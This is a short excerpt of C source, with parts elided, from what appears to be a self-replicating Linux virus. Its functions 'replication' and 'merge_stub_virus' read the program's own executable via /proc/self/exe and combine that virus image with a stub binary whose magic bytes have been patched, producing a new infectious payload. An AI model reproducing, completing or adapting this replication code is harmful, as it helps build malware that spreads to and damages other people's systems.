...
int merge_stub_virus(unsigned char **payload_bin, size_t *payload_size,
    ...
    *payload_bin = malloc(*payload_size);
    ...
    if (total != 2) {
        LOG_DEBUG("magic bytes patched stub not found.");
        ret = 1;
    }
...
int replication(unsigned char **payload_bin, size_t *payload_size,
    ...
    LOG_DEBUG("open_and_map: get self file.");
    if (open_and_map("/proc/self/exe", &virus_fd, virus_st, &virus_map) != 0) {
        LOG_DEBUG("open_and_map failed.");
        ret = 1;
        goto Error;
    }

    if (merge_stub_virus(payload_bin, payload_size, stub_bin, stub_bin_size, virus_map, virus_st)) {
        LOG_DEBUG("merge_stub_virus failed.");
    }
